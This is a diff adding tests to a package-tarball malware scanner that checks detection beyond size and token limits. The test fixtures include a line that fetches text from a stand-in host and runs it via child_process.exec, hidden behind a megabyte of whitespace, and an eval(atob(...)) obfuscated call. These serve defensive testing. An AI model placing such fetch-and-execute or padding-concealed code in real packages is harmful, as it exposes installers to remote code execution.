@@ -132,6 +132,29 @@ describe('package-content deep scanner', () => {
     assert.ok(result.findings.some((entry) => entry.ruleId === 'content-scan-incomplete'));
   });
 
+  it('inspects executable evidence beyond the previous one-MiB file boundary', () => {
+    const source = '/*' + ' '.repeat(1024 * 1024) + '*/\n' +
+      'const response = await fetch("https://example.test/tool"); const command = await response.text(); require("child_process").exec(command);';
+    const result = analyzePackageTarball(makeTarball([{ path: 'package/bundle.js', content: source }]));
+    assert.equal(result.summary.status, 'complete');
+    assert.ok(result.findings.some(f => f.ruleId === 'content-network-exec'));
+  });
+
+  it('retains a visible partial result beyond the new four-MiB file limit', () => {
+    const result = analyzePackageTarball(makeTarball([{ path: 'package/huge.js', content: ' '.repeat(4 * 1024 * 1024 + 1) }]));
+    assert.equal(result.summary.status, 'partial');
+    assert.equal(result.summary.filesSkipped, 1);
+    assert.ok(result.findings.some(f => f.ruleId === 'content-scan-incomplete'));
+  });
+
+  it('retains the eight-MiB aggregate text budget across larger files', () => {
+    const entries = [1, 2, 3].map(n => ({ path: `package/bundle-${n}.js`, content: ' '.repeat(3 * 1024 * 1024) }));
+    const result = analyzePackageTarball(makeTarball(entries));
+    assert.equal(result.summary.status, 'partial');
+    assert.equal(result.summary.filesScanned, 2);
+    assert.equal(result.summary.filesSkipped, 1);
+  });
+
   it('reports native executable content once per archive', () => {
     const archive = makeTarball([
       { path: 'package/prebuilds/a.node', content: Buffer.from([0, 1, 2]) },
@@ -187,11 +210,18 @@ describe('package-content deep scanner', () => {
   });
 
   it('reports a lexical inspection budget as partial rather than silently complete', () => {
-    const source = `const encoded = '${'A'.repeat(200)}'; Function(encoded);` + '0;'.repeat(150_000);
-    const result = analyzePackageTarball(makeTarball([{ path: 'package/dense.js', content: source }]));
+    const source = `const encoded = '${'A'.repeat(200)}'; Function(encoded);` + '0;'.repeat(200);
+    const result = analyzePackageTarball(makeTarball([{ path: 'package/dense.js', content: source }]), { maxTokensPerFile: 128 });
     assert.equal(result.summary.status, 'partial');
     assert.match(result.summary.reason!, /token inspection/);
     assert.ok(result.findings.some(f => f.ruleId === 'content-scan-incomplete'));
+  });
+
+  it('inspects executable evidence after more than the old 200,000-token budget', () => {
+    const source = '0;'.repeat(110_000) + 'eval(atob("aW5lcnQtZml4dHVyZQ=="));';
+    const result = analyzePackageTarball(makeTarball([{ path: 'package/dense-bundle.js', content: source }]));
+    assert.equal(result.summary.status, 'complete');
+    assert.ok(result.findings.some(f => f.ruleId === 'content-obfuscated-exec'));
   });
 
   it('keeps unrelated networking and process use as a capability rather than a high execution link', () => {
